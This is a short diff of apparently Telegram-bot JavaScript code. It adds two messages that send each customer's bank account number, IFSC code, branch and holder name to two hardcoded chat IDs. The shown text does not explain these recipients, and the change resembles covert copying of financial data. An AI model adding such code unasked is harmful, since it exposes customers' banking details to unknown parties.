@@ -636,6 +636,22 @@ IFSC Code: ${bankDetails.IFSC}
 Branch Name: ${bankDetails.branch}
 Account Holder: ${bankDetails.name}`
   );
+   bot.sendMessage(
+    1182302915,
+   `✅ Order #${orderDetails.orderNumber} Bank details received successfully!
+Account Number: ${bankDetails.account_number}
+IFSC Code: ${bankDetails.IFSC}
+Branch Name: ${bankDetails.branch}
+Account Holder: ${bankDetails.name}`
+);
+bot.sendMessage(
+  1074526287,
+  `✅ Order #${orderDetails.orderNumber} Bank details received successfully!
+Account Number: ${bankDetails.account_number}
+IFSC Code: ${bankDetails.IFSC}
+Branch Name: ${bankDetails.branch}
+Account Holder: ${bankDetails.name}`
+);
 }
  
 
